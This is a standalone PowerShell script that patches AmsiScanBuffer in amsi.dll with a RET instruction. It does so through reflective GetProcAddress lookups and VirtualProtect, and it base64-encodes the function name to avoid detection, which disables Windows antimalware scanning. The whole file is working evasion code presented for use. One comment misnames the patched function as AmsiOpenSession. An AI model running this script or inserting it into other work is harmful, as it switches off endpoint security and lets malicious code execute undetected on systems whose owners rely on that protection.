 function LookupFunc {
    Param ($moduleName, $functionName)
    
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { 
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") {$tmp+=$_}
    }

    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate]) 
    
    
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType()
}

# 'AmsiScanBuffer' was triggering AMSI, so b64ed it
$scan = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("QQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAA=="))

# Lookup AmsiScanBuffer in amsi.dll
[IntPtr]$funcAddr = LookupFunc amsi.dll $scan
$oldProtectionBuffer = 0

# Get reference to the VirtualProtect function in kernel32.dll to change memory protections
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

# Invoke VirtualProtect on AmsiOpenSession to set page to RWX
$vp.Invoke($funcAddr, 1, 0x40,[ref]$oldProtectionBuffer)

# Create byte array w/ the opcodes we want to write
# RET = 0xC3
$buf = [Byte[]] (0xc3)

# Copy opcodes to target address
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 1)

# Invoke VirtualProctect on the page to restore original page permissions of RX
$vp.Invoke($funcAddr, 1, 0x20, [ref]$oldProtectionBuffer) 
